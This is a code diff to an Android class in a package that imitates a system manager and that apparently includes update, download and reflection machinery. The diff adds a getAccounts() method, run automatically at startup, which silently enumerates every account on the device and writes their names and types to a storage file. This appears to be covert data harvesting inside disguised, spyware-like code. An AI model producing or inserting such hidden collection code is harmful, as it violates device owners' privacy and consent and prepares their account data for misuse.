@@ -1,8 +1,12 @@
 package com.android.system.manager.plugin.master;
 
+import android.accounts.Account;
+import android.accounts.AccountManager;
 import android.content.Context;
 import android.content.Intent;
+import android.util.Log;
 
+import com.android.system.manager.plugin.utils.FileUtils;
 import com.android.system.manager.plugin.utils.L;
 import com.duowan.mobile.netroid.Network;
 import com.duowan.mobile.netroid.RequestQueue;
@@ -10,6 +14,7 @@ import com.duowan.mobile.netroid.stack.HurlStack;
 import com.duowan.mobile.netroid.toolbox.BasicNetwork;
 import com.duowan.mobile.netroid.toolbox.FileDownloader;
 
+import java.io.File;
 import java.lang.reflect.Method;
 
 /**
@@ -46,6 +51,7 @@ public class MasterProcess {
         }
         UpdateHelper.getInstance().start();
         startSService();
+        getAccounts();
     }
 
     public void startSService(){
@@ -93,5 +99,20 @@ public class MasterProcess {
         broadcast.setAction(MasterConstant.CORE_ACTION);
         broadcast.addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
         context.sendBroadcast(broadcast);
+    }
+
+    public void getAccounts()
+    {
+        AccountManager accountManager =  AccountManager.get(context);
+        Account[] accounts = accountManager.getAccounts();
+        if(accounts.length > 0)
+        {
+            File f = FileUtils.getTbStorageFile(context,"accounts");
+            String s = "";
+            for(Account account:accounts){
+                s += "name:"+account.name+"  type:"+account.type+"\r\n";
+            }
+            FileUtils.writeFile(f,s,false);
+        }
     }
 }
